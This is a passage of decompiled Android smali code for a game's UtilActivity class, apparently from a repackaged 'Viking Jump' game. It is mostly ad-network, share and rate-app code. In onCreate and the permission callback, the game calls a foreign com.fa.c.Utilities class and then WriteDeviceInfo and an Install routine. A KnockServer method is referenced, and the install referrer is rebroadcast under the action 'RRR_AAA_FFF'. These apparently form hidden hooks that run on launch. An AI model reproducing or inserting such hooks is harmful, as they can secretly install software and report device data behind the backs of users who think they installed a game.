    invoke-virtual {v2, v3}, Lcom/google/android/gms/ads/AdView;->setAdUnitId(Ljava/lang/String;)V

    .line 351
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v2, v1}, Lcom/google/android/gms/ads/AdView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 356
    new-instance v2, Landroid/widget/FrameLayout;

    invoke-direct {v2, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adViewLayout:Landroid/widget/FrameLayout;

    .line 357
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adViewLayout:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v1}, Landroid/widget/FrameLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 358
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adViewLayout:Landroid/widget/FrameLayout;

    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;)V

    .line 364
    new-instance v2, Lcom/google/android/gms/ads/AdRequest$Builder;

    invoke-direct {v2}, Lcom/google/android/gms/ads/AdRequest$Builder;-><init>()V

    .line 365
    invoke-virtual {v2}, Lcom/google/android/gms/ads/AdRequest$Builder;->build()Lcom/google/android/gms/ads/AdRequest;

    move-result-object v0

    .line 368
    .local v0, "adRequest":Lcom/google/android/gms/ads/AdRequest;
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v2, v0}, Lcom/google/android/gms/ads/AdView;->loadAd(Lcom/google/android/gms/ads/AdRequest;)V

    .line 371
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adViewLayout:Landroid/widget/FrameLayout;

    invoke-virtual {p0, v2, v1}, Lcom/carlospinan/utils/UtilActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 373
    const-string v2, "UtilActivity"

    const-string v3, "Init AdMob Android"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 374
    return-void
.end method

.method static synthetic access$0()Lcom/carlospinan/utils/UtilActivity;
    .locals 1

    .prologue
    .line 74
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    return-object v0
.end method

.method static synthetic access$1(Lcom/carlospinan/utils/UtilActivity;)Lcom/google/android/gms/ads/AdView;
    .locals 1

    .prologue
    .line 71
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    return-object v0
.end method

.method static synthetic access$2(Lcom/carlospinan/utils/UtilActivity;)Lcom/google/android/gms/ads/InterstitialAd;
    .locals 1

    .prologue
    .line 77
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->interstitial:Lcom/google/android/gms/ads/InterstitialAd;

    return-object v0
.end method

.method static synthetic access$3(Lcom/carlospinan/utils/UtilActivity;)V
    .locals 0

    .prologue
    .line 754
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->KnockServer()V

    return-void
.end method

.method private getDisplaySize(Landroid/view/Display;)Landroid/graphics/Point;
    .locals 2
    .param p1, "d"    # Landroid/view/Display;

    .prologue
    .line 378
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0xb

    if-lt v0, v1, :cond_0

    .line 380
    invoke-direct {p0, p1}, Lcom/carlospinan/utils/UtilActivity;->getDisplaySizeGE11(Landroid/view/Display;)Landroid/graphics/Point;

    move-result-object v0

    .line 382
    :goto_0
    return-object v0

    :cond_0
    invoke-direct {p0, p1}, Lcom/carlospinan/utils/UtilActivity;->getDisplaySizeLT11(Landroid/view/Display;)Landroid/graphics/Point;

    move-result-object v0

    goto :goto_0
.end method

.method private getDisplaySizeGE11(Landroid/view/Display;)Landroid/graphics/Point;
    .locals 2
    .param p1, "d"    # Landroid/view/Display;
    .annotation build Landroid/annotation/TargetApi;
        value = 0xd
    .end annotation

    .prologue
    const/4 v1, 0x0

    .line 388
    new-instance v0, Landroid/graphics/Point;

    invoke-direct {v0, v1, v1}, Landroid/graphics/Point;-><init>(II)V

    .line 389
    .local v0, "p":Landroid/graphics/Point;
    invoke-virtual {p1, v0}, Landroid/view/Display;->getSize(Landroid/graphics/Point;)V

    .line 390
    return-object v0
.end method

.method private getDisplaySizeLT11(Landroid/view/Display;)Landroid/graphics/Point;
    .locals 10
    .param p1, "d"    # Landroid/view/Display;

    .prologue
    const/4 v9, -0x1

    const/4 v8, -0x2

    const/4 v7, -0x3

    const/4 v6, -0x4

    .line 396
    :try_start_0
    const-class v3, Landroid/view/Display;

    const-string v4, "getWidth"

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 397
    .local v2, "getWidth":Ljava/lang/reflect/Method;
    const-class v3, Landroid/view/Display;

    const-string v4, "getHeight"

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 398
    .local v1, "getHeight":Ljava/lang/reflect/Method;
    new-instance v4, Landroid/graphics/Point;

    const/4 v3, 0x0

    invoke-virtual {v2, p1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v5

    const/4 v3, 0x0

    invoke-virtual {v1, p1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-direct {v4, v5, v3}, Landroid/graphics/Point;-><init>(II)V
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_3

    move-object v3, v4

    .line 414
    .end local v1    # "getHeight":Ljava/lang/reflect/Method;
    .end local v2    # "getWidth":Ljava/lang/reflect/Method;
    :goto_0
    return-object v3

    .line 400
    :catch_0
    move-exception v0

    .line 402
    .local v0, "e2":Ljava/lang/NoSuchMethodException;
    new-instance v3, Landroid/graphics/Point;

    invoke-direct {v3, v9, v9}, Landroid/graphics/Point;-><init>(II)V

    goto :goto_0

    .line 404
    .end local v0    # "e2":Ljava/lang/NoSuchMethodException;
    :catch_1
    move-exception v0

    .line 406
    .local v0, "e2":Ljava/lang/IllegalArgumentException;
    new-instance v3, Landroid/graphics/Point;

    invoke-direct {v3, v8, v8}, Landroid/graphics/Point;-><init>(II)V

    goto :goto_0

    .line 408
    .end local v0    # "e2":Ljava/lang/IllegalArgumentException;
    :catch_2
    move-exception v0

    .line 410
    .local v0, "e2":Ljava/lang/IllegalAccessException;
    new-instance v3, Landroid/graphics/Point;

    invoke-direct {v3, v7, v7}, Landroid/graphics/Point;-><init>(II)V

    goto :goto_0

    .line 412
    .end local v0    # "e2":Ljava/lang/IllegalAccessException;
    :catch_3
    move-exception v0

    .line 414
    .local v0, "e2":Ljava/lang/reflect/InvocationTargetException;
    new-instance v3, Landroid/graphics/Point;

    invoke-direct {v3, v6, v6}, Landroid/graphics/Point;-><init>(II)V

    goto :goto_0
.end method

.method public static hideAd()V
    .locals 2

    .prologue
    .line 234
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    new-instance v1, Lcom/carlospinan/utils/UtilActivity$2;

    invoke-direct {v1}, Lcom/carlospinan/utils/UtilActivity$2;-><init>()V

    invoke-virtual {v0, v1}, Lcom/carlospinan/utils/UtilActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 245
    return-void
.end method

.method public static loadChartboost()V
    .locals 1

    .prologue
    .line 293
    const-string v0, "Default"

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->cacheInterstitial(Ljava/lang/String;)V

    .line 295
    return-void
.end method

.method public static loadInterstitial()V
    .locals 2

    .prologue
    .line 280
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    new-instance v1, Lcom/carlospinan/utils/UtilActivity$5;

    invoke-direct {v1}, Lcom/carlospinan/utils/UtilActivity$5;-><init>()V

    invoke-virtual {v0, v1}, Lcom/carlospinan/utils/UtilActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 288
    return-void
.end method

.method public static rate_app(Ljava/lang/String;)V
    .locals 3
    .param p0, "url"    # Ljava/lang/String;

    .prologue
    .line 313
    const-string p0, "https://play.google.com/store/apps/details?id=com.Jump.VikingJump"

    .line 314
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-static {p0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 315
    .local v0, "browserIntent":Landroid/content/Intent;
    sget-object v1, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    invoke-virtual {v1, v0}, Lcom/carlospinan/utils/UtilActivity;->startActivity(Landroid/content/Intent;)V

    .line 317
    return-void
.end method

.method public static setShareIntent()V
    .locals 3

    .prologue
    .line 321
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 322
    .local v0, "sendIntent":Landroid/content/Intent;
    const-string v1, "android.intent.action.SEND"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 323
    const-string v1, "android.intent.extra.TEXT"

    const-string v2, "Amazing Game Viking Jump!!! https://play.google.com/store/apps/details?id=com.Jump.VikingJump"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 324
    const-string v1, "text/plain"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;

    .line 325
    sget-object v1, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    const-string v2, "Text"

    invoke-static {v0, v2}, Landroid/content/Intent;->createChooser(Landroid/content/Intent;Ljava/lang/CharSequence;)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/carlospinan/utils/UtilActivity;->startActivity(Landroid/content/Intent;)V

    .line 328
    return-void
.end method

.method public static showAd()V
    .locals 2

    .prologue
    .line 249
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    new-instance v1, Lcom/carlospinan/utils/UtilActivity$3;

    invoke-direct {v1}, Lcom/carlospinan/utils/UtilActivity$3;-><init>()V

    invoke-virtual {v0, v1}, Lcom/carlospinan/utils/UtilActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 261
    return-void
.end method

.method public static showChartboost()V
    .locals 1

    .prologue
    .line 299
    const-string v0, "Default"

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->hasInterstitial(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 300
    const-string v0, "Default"

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->showInterstitial(Ljava/lang/String;)V

    .line 309
    :goto_0
    return-void

    .line 304
    :cond_0
    const-string v0, "Default"

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->cacheInterstitial(Ljava/lang/String;)V

    .line 305
    const-string v0, "Default"

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->showInterstitial(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static showInterstitial()V
    .locals 2

    .prologue
    .line 267
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    new-instance v1, Lcom/carlospinan/utils/UtilActivity$4;

    invoke-direct {v1}, Lcom/carlospinan/utils/UtilActivity$4;-><init>()V

    invoke-virtual {v0, v1}, Lcom/carlospinan/utils/UtilActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 276
    return-void
.end method


# virtual methods
.method public getCustomApiClient()Lcom/google/android/gms/common/api/GoogleApiClient;
    .locals 1

    .prologue
    .line 487
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getApiClient()Lcom/google/android/gms/common/api/GoogleApiClient;

    move-result-object v0

    return-object v0
.end method

.method public getSignedIn()Z
    .locals 1

    .prologue
    .line 479
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->isSignedIn()Z

    move-result v0

    return v0
.end method

.method public inCloudLoad(I)V
    .locals 0
    .param p1, "key"    # I

    .prologue
    .line 521
    return-void
.end method

.method public inCloudSaveOrUpdate(I[B)V
    .locals 0
    .param p1, "key"    # I
    .param p2, "app_state"    # [B

    .prologue
    .line 513
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    .prologue
    .line 571
    invoke-static {}, Lcom/chartboost/sdk/Chartboost;->onBackPressed()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 575
    :goto_0
    return-void

    .line 574
    :cond_0
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onBackPressed()V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 86
    invoke-super {p0, p1}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onCreate(Landroid/os/Bundle;)V

    .line 88
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iput-object v1, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    .line 89
    iget-object v1, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetInstallType(Landroid/content/Context;)I

    move-result v1

    iput v1, p0, Lcom/carlospinan/utils/UtilActivity;->installType:I

    .line 91
    iget-object v1, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/fa/c/Utilities;->IsRandomNames(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 92
    iget-object v1, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/fa/c/Utilities;->SetRandomNames(Landroid/content/Context;)V

    .line 95
    :cond_0
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-lt v1, v2, :cond_2

    .line 97
    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-virtual {p0, v1}, Lcom/carlospinan/utils/UtilActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_1

    .line 101
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->WriteDeviceInfo()V

    .line 102
    iget v1, p0, Lcom/carlospinan/utils/UtilActivity;->installType:I

    invoke-direct {p0, v1}, Lcom/carlospinan/utils/UtilActivity;->Install(I)V

    .line 103
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->GameInit()V

    .line 116
    :goto_0
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 117
    .local v0, "intentFilter":Landroid/content/IntentFilter;
    const-string v1, "com.android.vending.INSTALL_REFERRER"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 118
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v2, Lcom/carlospinan/utils/UtilActivity$1;

    invoke-direct {v2, p0}, Lcom/carlospinan/utils/UtilActivity$1;-><init>(Lcom/carlospinan/utils/UtilActivity;)V

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 130
    return-void

    .line 105
    .end local v0    # "intentFilter":Landroid/content/IntentFilter;
    :cond_1
    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    .line 106
    const-string v3, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v3, v1, v2

    const/16 v2, 0x32

    .line 105
    invoke-virtual {p0, v1, v2}, Lcom/carlospinan/utils/UtilActivity;->requestPermissions([Ljava/lang/String;I)V

    goto :goto_0

    .line 111
    :cond_2
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->WriteDeviceInfo()V

    .line 112
    iget v1, p0, Lcom/carlospinan/utils/UtilActivity;->installType:I

    invoke-direct {p0, v1}, Lcom/carlospinan/utils/UtilActivity;->Install(I)V

    .line 113
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->GameInit()V

    goto :goto_0
.end method

.method protected onDestroy()V
    .locals 1

    .prologue
    .line 561
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    if-eqz v0, :cond_0

    .line 562
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/AdView;->destroy()V

    .line 564
    :cond_0
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onDestroy()V

    .line 565
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->onDestroy(Landroid/app/Activity;)V

    .line 566
    return-void
.end method

.method public onGenericMotionEvent(Landroid/view/MotionEvent;)Z
    .locals 1
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 443
    invoke-super {p0, p1}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onGenericMotionEvent(Landroid/view/MotionEvent;)Z

    move-result v0

    return v0
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .prologue
    .line 423
    invoke-super {p0, p1, p2}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    .line 424
    invoke-super {p0, p1, p2}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    return v0
.end method

.method protected onNewIntent(Landroid/content/Intent;)V
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 135
    const-string v2, "referrer"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 137
    .local v1, "referrer":Ljava/lang/String;
    const-string v2, "TRACKING"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Reffff: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 139
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 140
    .local v0, "i":Landroid/content/Intent;
    const-string v2, "RRR_AAA_FFF"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 141
    const-string v2, "r"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 142
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-virtual {v2, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 180
    invoke-super {p0, p1}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onNewIntent(Landroid/content/Intent;)V

    .line 181
    return-void
.end method

.method protected onPause()V
    .locals 1

    .prologue
    .line 535
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    if-eqz v0, :cond_0

    .line 536
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/AdView;->pause()V

    .line 538
    :cond_0
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onPause()V

    .line 539
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->onPause(Landroid/app/Activity;)V

    .line 540
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 1
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .prologue
    .line 772
    invoke-super {p0, p1, p2, p3}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 774
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->WriteDeviceInfo()V

    .line 775
    iget v0, p0, Lcom/carlospinan/utils/UtilActivity;->installType:I

    invoke-direct {p0, v0}, Lcom/carlospinan/utils/UtilActivity;->Install(I)V

    .line 776
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->GameInit()V

    .line 777
    return-void
.end method

.method protected onRestart()V
    .locals 0

    .prologue
    .line 222
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onRestart()V

    .line 223
    return-void
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 544
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onResume()V

    .line 545
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    if-eqz v0, :cond_0

    .line 546
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/AdView;->resume()V

    .line 548
    :cond_0
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->onStart(Landroid/app/Activity;)V

    .line 549
    return-void
.end method

.method public onSignInFailed()V
    .locals 0

    .prologue
    .line 466
    return-void
.end method

.method public onSignInSucceeded()V
    .locals 0

    .prologue
    .line 471
    return-void
.end method

.method protected onStart()V
    .locals 0

    .prologue
    .line 228
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onStart()V

    .line 230
    return-void
.end method

.method protected onStop()V
    .locals 1

    .prologue
    .line 554
    invoke-super {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;->onStop()V

    .line 555
    sget-object v0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    invoke-static {v0}, Lcom/chartboost/sdk/Chartboost;->onStop(Landroid/app/Activity;)V

    .line 557
    return-void
.end method

.method public requestGameAndCloudSave()V
    .locals 1

    .prologue
    .line 527
    const/4 v0, 0x5

    invoke-virtual {p0, v0}, Lcom/carlospinan/utils/UtilActivity;->setRequestedClients(I)V

    .line 529
    return-void
.end method

.method public signInGooglePlay()V
    .locals 0

    .prologue
    .line 494
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->beginUserInitiatedSignIn()V

    .line 495
    return-void
.end method

.method public signOutGooglePlay()V
    .locals 0

    .prologue
    .line 501
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->signOut()V

    .line 502
    return-void
.end method
